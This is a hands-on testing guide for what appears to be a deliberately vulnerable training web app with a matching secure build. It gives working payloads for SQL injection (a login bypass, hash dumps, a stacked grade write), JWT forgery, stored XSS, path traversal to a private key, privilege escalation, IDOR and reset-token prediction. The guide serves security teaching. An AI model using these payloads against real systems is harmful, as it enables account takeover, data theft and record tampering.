# Manual testing guide — try every vulnerability by hand

This walks through all **15** vulnerabilities using the browser (and its DevTools
console) against the running lab. For each one: do it on the **vuln** build and watch
it work, then repeat on the **secure** build and watch it fail.

- Vulnerable build: **http://127.0.0.1:3000**
- Secure build: **http://127.0.0.1:3001**

### Seed accounts

| Username | Password | Role | Notes |
|----------|----------|------|-------|
| `admin` | `admin123` | admin | id 1 |
| `prof_smith` | `teach123` | professor | teaches PROG, DB, ALGO (id 2) |
| `prof_jones` | `teach456` | professor | teaches MATH, PHYS, NET (id 3) |
| `alice` | `password1` | student | id 4, enrolled in everything |
| `bob` | `hunter2` | student | id 5 |
| `carol` | `qwerty` | student | id 6 |

### The console helper

A few attacks need a request the UI doesn't send (an extra field, a crafted header).
The easiest "manual" way is the browser **DevTools Console** (F12 → Console) after you
log in. Paste this once per tab — it sends requests as the logged-in user:

```js
T = localStorage.token;
call = (m, p, b) => fetch(p, {
  method: m,
  headers: { Authorization: 'Bearer ' + T, ...(b ? {'Content-Type':'application/json'} : {}) },
  ...(b ? { body: JSON.stringify(b) } : {})
}).then(r => r.json()).then(j => (console.log(j), j));
```

Then e.g. `call('GET', '/api/me')`.

---

## 1. SQL injection — login bypass

1. Go to the **login page** (vuln build, logged out).
2. Username: `admin'-- ` (note the trailing space), Password: anything.
3. **Sign in** → you're in as **admin** with no password.

**Secure:** same input → "invalid username or password".

## 2. SQL injection — certifications (read other students / dump hashes)

Log in as `alice`. In the Console:

```js
call('GET', "/api/certifications?student_id=0 OR 1=1");          // every student's certs
call('GET', "/api/certifications?student_id=0 UNION SELECT id,role,username,password_hash,hash_scheme,NULL,full_name FROM users");
```

The second returns every user's **MD5 hash** (in the `grade`/`title` fields).

**Secure:** the `OR 1=1` / `UNION` requests return `403` (and a student may read only
their own id).

## 3. Broken JWT — forge an admin token

The vuln build never checks the signature. Log in as `alice`, then in the Console
rebuild your own token with `role: admin` and reload:

```js
const [h, p] = localStorage.token.split('.');
const pl = JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));
pl.role = 'admin';
const b64 = o => btoa(JSON.stringify(o)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
localStorage.token = `${h}.${b64(pl)}.anything`;   // signature ignored in vuln
location.reload();
```

You now have the **Users** and (secure build only) admin menus. Confirm with
`call('GET','/api/admin/users')`.

**Secure:** the forged token returns `401` everywhere (sign out / log back in to get a
real token).

## 4. IDOR — read anyone's private chat

Log in as `alice`. Open **Chat**, click any conversation. The address bar shows
`…#chat?chat_users[0]=4&chat_users[1]=5`. Change it to:

```
#chat?chat_users[0]=1&chat_users[1]=2
```

You now read the private **admin ↔ prof_smith** conversation — including the line
"the grading portal master password is `Adm1n_Gu@rd14n_2026`".

**Secure:** the same URL shows `forbidden`.

## 5. Privilege escalation at registration

The sign-up form never sends a role, but the vuln build accepts one. In the Console
(you don't even need to be logged in):

```js
fetch('/api/register', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({username:'hacker', password:'x', role:'admin'})}).then(r=>r.json()).then(console.log);
```

Log in as `hacker`/`x` → you're an **admin**.

**Secure:** the new account comes back as `student` regardless of what you send.

## 6. Broken access control

**6a — a student changes their own grade.** As `alice`:

```js
call('POST','/api/grades', {course_id:1, student_id:4, grade:'20.00'});   // Mathematics
```

Dashboard now shows 20/20. **Secure:** `403` (not authorized to grade this course).

**6b — a student mints a fake diploma.** As `alice`:

```js
call('POST','/api/certifications', {student_id:4, title:'PhD in Computer Science', grade:'A+', issued_date:'2026-01-01'});
```

It appears on the Certifications page as **valid**. **Secure:** `403` (only the
course's professor may issue, to enrolled students, recognised types only).

**6c — admin list trusts the token.** With the forged admin token from #3,
`call('GET','/api/admin/users')` returns everyone **including `password_hash`**.
**Secure:** `403` for anyone who isn't really admin, and hashes are never returned.

## 7. Insecure password hashing (unsalted MD5)

Take any hash leaked in #2/#6c and reverse it — unsalted MD5 is instant:

```bash
python3 -c 'import hashlib; print(hashlib.md5(b"admin123").hexdigest())'
# 0192023a7bbd73250516f069df18b500  == the dumped admin hash
```

**Secure:** `sqlite3 sms_secure.db "SELECT hash_scheme,salt FROM users"` shows
`pbkdf2` with a per-user salt; the hashes don't reverse.

## 8. Cryptography — signatures & encryption at rest

**8a — forged certificate looks real (vuln).** After #6b, the Certifications page
marks the fake PhD **valid**. **Secure:** a certificate inserted/edited directly in
the DB shows **✗ invalid** and **not on chain**.

**8b — plaintext messages at rest.** In a shell at the project root:

```bash
sqlite3 sms_vuln.db   "SELECT body FROM messages LIMIT 3;"   # readable plaintext
sqlite3 sms_secure.db "SELECT body FROM messages LIMIT 3;"   # AES-GCM ciphertext
```

## 9. No integrity anchoring — silent grade tampering

Simulate someone who reached the database (shell at project root):

```bash
sqlite3 sms_vuln.db   "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
sqlite3 sms_secure.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
```

- **Vuln:** log in as `alice` → Dashboard shows 20/20, nothing flags it.
- **Secure:** `alice`'s Dashboard shows the tampered value struck through in red with
  the **verified** grade beside it, and the average is unchanged. Log in as `admin` →
  the **Integrity** page (and the sidebar badge) shows the tampering, with
  **Restore** / **Restore all from ledger** to rewrite the DB back to the anchored
  value.

## 10. SQL injection — course search (stacked write)

Log in as `alice`, open **Course search**.

- **Read / dump hashes** — search for:
  `' UNION SELECT id, password_hash, role FROM users -- `
  (hashes appear in the `code` column).
- **Write a grade with no admin, no Gradebook** — search for:
  `%'; UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1; -- `
  The search shows no results, but the Dashboard Math grade is now 20/20.

**Secure:** both return no matching courses and change nothing.

## 11. Stored XSS — announcements

Log in as `prof_jones` (or `admin`). Open **Announcements**, publish one with the
**message** body:

```html
<img src=x onerror="alert(document.cookie)">
```

On the **vuln** build the script runs for everyone who opens Announcements or the
Dashboard — including the admin. **Secure:** the body shows as literal text and never
executes.

## 12. IDOR — read another student's document

Log in as `alice`, open **Documents**, submit a request (see #15 for the upload). Your
request shows a reference like `DOC-2026-0003`. Now open another student's document by
id — in the address bar:

```
#documents?doc=1
```

or in the Console `call('GET','/api/documents/1')`. **Vuln:** you see someone else's
document (name, e-mail, reference). **Secure:** `forbidden`.

## 13. Mass assignment — become admin from your profile

The Profile form only edits name/email/phone/address, but the vuln build writes any
field you send. As `alice`, in the Console:

```js
call('POST','/api/profile', {full_name:'Alice Anderson', role:'admin'});
location.reload();
```

You're now admin (the **Users** menu appears). **Secure:** `role` is ignored — you
stay a student.

## 14. Predictable password-reset token — account takeover

On the **login page**, click **Forgot your password?**, enter `carol`, **Send reset
token**.

- **Vuln:** the token is shown to you (and it's just `md5("reset:carol")[:12]`). Enter
  a new password → **Set new password** → log in as `carol` with it.
- **Secure:** no token is shown (it would be e-mailed / is in the server log), and a
  guessed MD5 token is rejected. Only the random token works, once, for 15 minutes.

You can confirm the vuln token is predictable:
`python3 -c 'import hashlib;print(hashlib.md5(b"reset:carol").hexdigest()[:12])'`.

## 15. Unrestricted file upload + path traversal + IDOR (documents)

Log in as `alice`, open **Documents**.

**A — upload a non-PDF (stored XSS).** Create `evil.svg`:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.svg
```

Pick a type, choose `evil.svg`, **Submit request**. On the **vuln** build it's
accepted; click **My upload** → it opens inline and the script runs. **Secure:** the
upload is rejected ("only PDF files are accepted").

**B — path traversal (read server secrets).** Note your new document's id (from the
Console: `call('GET','/api/my/documents')`), then:

```js
fetch('/api/documents/ID/download?name=../../keys/eth_issuer.key',
  {headers:{Authorization:'Bearer '+localStorage.token}}).then(r=>r.text()).then(console.log);
```

**Vuln:** it prints the on-chain **issuer private key** (try `../../sms_vuln.db` for
the whole database). **Secure:** the `name` parameter is ignored.

**C — IDOR on downloads.** As `bob`, download `alice`'s file:
`call('GET', …)` won't show the bytes, so use fetch:
`fetch('/api/documents/<aliceDocId>/download?which=request',{headers:{Authorization:'Bearer '+localStorage.token}})`.
**Vuln:** `200` (you get it). **Secure:** `403`.

**Admin side (same upload flaw).** Log in as `admin`, open **Documents**, and on a
pending request click the file picker + **Approve + upload PDF**. The vuln build
accepts any file for the "issued" document too; the secure build enforces PDF-only +
random name + attachment download.

---

### Resetting after testing

Changes persist. To get back to a clean seed:

```bash
RESET_DB=1 docker compose up          # fresh DBs + fresh contract + re-anchor
# then recreate without the flag so persistence resumes:
HOST_UID=$(id -u) HOST_GID=$(id -g) docker compose up -d --force-recreate --no-deps secure vuln
```
